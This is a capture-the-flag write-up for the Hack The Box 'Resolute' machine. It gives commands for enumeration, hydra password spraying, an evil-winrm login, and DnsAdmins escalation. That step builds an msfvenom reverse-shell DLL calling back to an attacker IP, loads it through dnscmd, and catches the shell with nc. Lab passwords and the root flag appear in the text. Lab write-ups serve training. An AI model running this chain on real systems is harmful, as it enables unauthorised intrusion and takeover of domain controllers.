We being to enumerate the box with nmap

```
nmap -sV -sC -sS -Pn -T4 10.10.10.169 -p-
```
We see that this is an active directory and add the domain name to the /etc/host file 
```
echo "10.10.10.169  megabank.local" >> /etc/hosts
```
Afterwards we review the nmap results to begin enumeration with enum4linux:
```
enum4linux -a 10.10.10.169
```
We find the password for the user Marko ```Welcome123!```

We then get the root dn ```DC=megabank,DC=local``` using nmap:
```
nmap --script=ldap-search -Pn -p 389 10.10.10.169
```
we try to sign in with marko but it was not his password so we used hydra to find the right user for the password:
```
hydra -L resolute_users.txt -p Welcome123! smb://10.10.10.169 -V -f
```
we sign in with the user melanie:

```
evil-winrm -i  megabank.local -u melanie -p Welcome123!
```

We begin to enumerate the machine and start with the C:\ directory:
```
Get-ChildItem -Force
```
this listed all the folders in the directory and we decided to checkout the ```PSTranscripts``` folder and
find a file called ```PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt``` her we find the password for the 
user ryan : ```Serv3r4Admin4cc123!```

We login as ryan and use the command ```whoami \all``` to see that we are part of the dnsadmins group.
with that knowledge we do dll injection and create a payload with msfvenom and use smbserver.py:
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.11 LPORT=1234-f dll -o resol.dll
./smbserver.py SHARE ./
```
As ryan we then share the file and open up a listener:
```
dnscmd RESOLUTE /config /serverlevelplugindll \\10.10.16.11\SHARE\resol.dll
sc.exe stop dns
sc.exe start dns
```
```nc -nlvp 1234```

We successfully login as Administrator and find the root flag.

root flag: ```feb02414afa5a93579d64d3f5c9c561a```

System has been rooted; action is no longer required.







